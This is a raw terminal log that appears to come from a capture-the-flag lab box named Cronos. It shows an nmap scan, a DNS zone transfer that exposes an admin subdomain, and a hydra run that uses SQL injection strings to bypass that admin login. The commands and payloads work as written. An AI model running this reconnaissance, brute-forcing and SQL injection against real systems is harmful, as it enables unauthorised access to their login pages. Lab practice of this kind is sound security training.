nmap -p22,53,80 -sV -sC -Pn -T4 -oA 10.10.10.13 10.10.10.13
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 12:46 EDT
Nmap scan report for 10.10.10.13
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel






dig axfr @10.10.10.13 cronos.htb                                                              1 ⨯ 4 ⚙

; <<>> DiG 9.16.11-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 135 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Wed Jun 16 13:03:30 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)



hydra -L /home/kali/seclists/Usernames/sqlinjection.txt -P /home/kali/seclists/Usernames/sqlinjection.txt admin.cronos.htb http-post-form "/:username=^USER^&password=^PWD^:Your Login Name or Password is invalid" -t 50
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-16 13:19:58
[DATA] max 50 tasks per 1 server, overall 50 tasks, 64 login tries (l:8/p:8), ~2 tries per task
[DATA] attacking http-post-form://admin.cronos.htb:80/:username=^USER^&password=^PWD^:Your Login Name or Password is invalid
[80][http-post-form] host: admin.cronos.htb   login: admin' #   password: admin' --
[80][http-post-form] host: admin.cronos.htb   login: admin' #   password: admin' #
[80][http-post-form] host: admin.cronos.htb   login: admin' #   password: ') or ('1'='1-
[80][http-post-form] host: admin.cronos.htb   login: admin' #   password: admin'/*
[80][http-post-form] host: admin.cronos.htb   login: admin' #   password: ' or 1=1#
[80][http-post-form] host: admin.cronos.htb   login: admin' #   password: ' or 1=1--
[80][http-post-form] host: admin.cronos.htb   login: admin' #   password: ' or 1=1/*
[80][http-post-form] host: admin.cronos.htb   login: admin' #   password: ') or '1'='1--
[80][http-post-form] host: admin.cronos.htb   login: ' or 1=1#   password: ' or 1=1#
[80][http-post-form] host: admin.cronos.htb   login: ' or 1=1#   password: admin' --
[80][http-post-form] host: admin.cronos.htb   login: ' or 1=1#   password: admin' #
[80][http-post-form] host: admin.cronos.htb   login: ' or 1=1#   password: ' or 1=1--
[80][http-post-form] host: admin.cronos.htb   login: ' or 1=1#   password: admin'/*
[80][http-post-form] host: admin.cronos.htb   login: ' or 1=1#   password: ') or ('1'='1-
[80][http-post-form] host: admin.cronos.htb   login: ' or 1=1#   password: ' or 1=1/*
[80][http-post-form] host: admin.cronos.htb   login: ' or 1=1#   password: ') or '1'='1--
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-16 13:20:01
                                                                                           


